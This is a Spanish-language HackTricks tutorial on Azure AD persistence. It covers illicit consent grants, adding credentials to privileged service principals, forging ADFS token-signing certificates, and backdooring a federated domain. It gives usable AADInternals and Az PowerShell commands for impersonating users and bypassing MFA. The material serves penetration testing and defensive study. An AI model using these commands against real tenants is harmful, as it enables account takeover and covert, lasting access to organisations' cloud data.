# Az - Persistencia

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en Github.

</details>

### Concesión de consentimiento ilícito

Por defecto, cualquier usuario puede registrar una aplicación en Azure AD. Por lo tanto, puedes registrar una aplicación (solo para el inquilino objetivo) que necesite permisos de alto impacto con el consentimiento del administrador (y aprobarlo si eres el administrador) - como enviar correo en nombre de un usuario, gestión de roles, etc. Esto nos permitirá **ejecutar ataques de phishing** que serían muy **fructíferos** en caso de éxito.

Además, también podrías aceptar esa aplicación con tu usuario como una forma de mantener el acceso sobre ella.

### Aplicaciones y Principales de Servicio

Con privilegios de Administrador de Aplicaciones, GA o un rol personalizado con permisos de actualización de microsoft.directory/aplicaciones/credenciales, podemos agregar credenciales (secreto o certificado) a una aplicación existente.

Es posible **apuntar a una aplicación con permisos elevados** o **agregar una nueva aplicación** con permisos elevados.

Un rol interesante para agregar a la aplicación sería el **rol de administrador de autenticación privilegiada** ya que permite **restablecer la contraseña** de los administradores globales.

Esta técnica también permite **burlar la MFA**.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* Para autenticación basada en certificado

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### Federación - Certificado de firma de token

Con **privilegios de DA** en AD local, es posible crear e importar **nuevos certificados de firma de token** y **descifrado de token** que tienen una validez muy larga. Esto nos permitirá **iniciar sesión como cualquier usuario** cuyo ImuutableID conozcamos.

**Ejecuta** el siguiente comando como **DA en el servidor(es) ADFS** para crear nuevos certificados (contraseña predeterminada 'AADInternals'), agregarlos a ADFS, desactivar la rotación automática y reiniciar el servicio:

```powershell
New-AADIntADFSSelfSignedCertificates
```

Luego, actualiza la información del certificado con Azure AD:

```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```

### Federación - Dominio de confianza

Con privilegios de GA en un inquilino, es posible **agregar un nuevo dominio** (debe ser verificado), configurar su tipo de autenticación como federado y configurar el dominio para **confiar en un certificado específico** (any.sts en el siguiente comando) y emisor:

```powershell
# Usando AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Obtener el ImmutableID del usuario que queremos suplantar. Usando el módulo Msol
Get-MsolUser | select userPrincipalName,ImmutableID

# Acceder a cualquier aplicación en la nube como el usuario
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```

## Referencias

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en Github.

</details>